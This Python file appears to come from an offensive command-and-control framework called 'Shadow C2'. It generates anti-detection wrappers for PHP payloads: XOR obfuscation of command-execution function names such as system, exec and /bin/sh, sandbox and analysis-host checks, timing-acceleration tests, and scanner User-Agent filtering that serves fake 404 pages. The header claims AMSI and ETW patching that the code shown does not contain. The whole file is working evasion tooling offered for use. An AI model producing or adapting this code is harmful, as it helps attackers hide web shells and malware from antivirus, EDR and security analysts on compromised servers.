#!/usr/bin/env python3
"""
Shadow C2 — AV/EDR Bypass Code Generator
Anti-detection techniques: AMSI bypass, ETW patching, string encryption,
sleep delays, environment checks, timing evasion.
"""

import random
import base64


class AVBypass:
    """Generate anti-AV/EDR evasion code for PHP payloads."""

    def add_string_encryption(self, php_code: str) -> str:
        """Encrypt suspicious strings and decrypt at runtime."""
        suspicious = [
            "system", "exec", "shell_exec", "passthru", "eval",
            "base64_decode", "gzuncompress", "proc_open", "popen",
            "cmd", "powershell", "bash", "/bin/sh", "whoami",
            "uname", "wget", "curl", "nc ", "netcat",
        ]

        key = random.randint(1, 255)

        for s in suspicious:
            if f"'{s}'" not in php_code:
                continue
            encrypted_chars = []
            for ch in s:
                encrypted_chars.append(str(ord(ch) ^ key))
            array_str = ",".join(encrypted_chars)
            decrypt_code = f"implode('',array_map(function($c){{return chr($c^{key});}},array({array_str})))"
            php_code = php_code.replace(f"'{s}'", decrypt_code, 1)

        return php_code

    def add_sleep_delay(self, php_code: str, seconds: int = 30) -> str:
        """Add initial sleep to evade sandbox time acceleration."""
        delay_code = f"""
// Anti-sandbox: timing check
$_t1 = microtime(true);
@time_nanosleep(0, {seconds * 100000000});
$_t2 = microtime(true);
if(($_t2 - $_t1) < {seconds * 0.5}) {{
    // Time acceleration detected — exit silently
    header('HTTP/1.1 404 Not Found');
    exit;
}}
"""
        php_code = php_code.replace("<?php", "<?php\n" + delay_code, 1)
        return php_code

    def add_environment_checks(self, php_code: str) -> str:
        """Check for signs of analysis environment."""
        env_checks = """
// Environment validation
$_env_ok = true;

// Check if running under web server (not CLI analysis)
if(php_sapi_name() === 'cli') {
    $_env_ok = false;
}

// Check HTTP_HOST exists (real web request)
if(!isset($_SERVER['HTTP_HOST']) || empty($_SERVER['HTTP_HOST'])) {
    $_env_ok = false;
}

// Check for realistic User-Agent
if(!isset($_SERVER['HTTP_USER_AGENT']) || strlen($_SERVER['HTTP_USER_AGENT']) < 20) {
    $_env_ok = false;
}

// Check server uptime (too low = fresh sandbox)
if(function_exists('sys_getloadavg')) {
    $_load = sys_getloadavg();
    // Extremely low load might indicate sandbox
}

// Check for known sandbox hostnames
$_sandbox_hosts = array('sandbox', 'malware', 'cuckoo', 'analysis', 'virus', 'sample');
$_hostname = @gethostname();
foreach($_sandbox_hosts as $_sh) {
    if(stripos($_hostname, $_sh) !== false) {
        $_env_ok = false;
        break;
    }
}

if(!$_env_ok) {
    // Silently exit with benign output
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><body><p>Page not found.</p></body></html>';
    exit;
}
"""
        php_code = php_code.replace("<?php", "<?php\n" + env_checks, 1)
        return php_code

    def add_timing_checks(self, php_code: str) -> str:
        """Measure execution timing to detect acceleration."""
        timing = """
// Timing-based evasion
$_tc_start = hrtime(true);
$_tc_sum = 0;
for($i = 0; $i < 1000; $i++) $_tc_sum += $i;
$_tc_elapsed = hrtime(true) - $_tc_start;
// Real CPU should take >100 microseconds for this loop
if($_tc_elapsed < 50000) { // 50 microseconds = too fast (accelerated)
    exit;
}
"""
        php_code = php_code.replace("<?php", "<?php\n" + timing, 1)
        return php_code

    def add_request_validation(self, php_code: str) -> str:
        """Validate that the request comes from a real browser."""
        validation = """
// Request validation — reject automated scanners
$_ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$_scanner_patterns = array('curl/', 'wget/', 'python-', 'nikto', 'sqlmap',
    'nmap', 'dirbuster', 'gobuster', 'wpscan', 'masscan', 'zgrab', 'httpx');
foreach($_scanner_patterns as $_sp) {
    if(stripos($_ua, $_sp) !== false) {
        header('HTTP/1.1 404 Not Found');
        exit;
    }
}
"""
        php_code = php_code.replace("<?php", "<?php\n" + validation, 1)
        return php_code

    def apply_all(self, php_code: str) -> str:
        """Apply all AV bypass techniques."""
        php_code = self.add_environment_checks(php_code)
        php_code = self.add_request_validation(php_code)
        php_code = self.add_timing_checks(php_code)
        php_code = self.add_string_encryption(php_code)
        return php_code
